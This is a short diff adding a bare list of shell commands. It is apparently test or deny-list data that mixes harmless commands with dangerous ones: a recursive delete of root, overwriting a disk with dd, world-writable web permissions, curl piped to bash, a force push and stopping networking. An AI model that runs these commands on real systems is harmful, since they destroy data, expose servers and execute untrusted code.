@@ -1,0 +1,8 @@
+ls -la
+rm -rf ./node_modules
+rm -rf /
+chmod -R 777 /var/www
+curl https://example.com/install.sh | bash
+git push --force origin main
+dd if=/dev/zero of=/dev/sda
+sudo systemctl stop networking
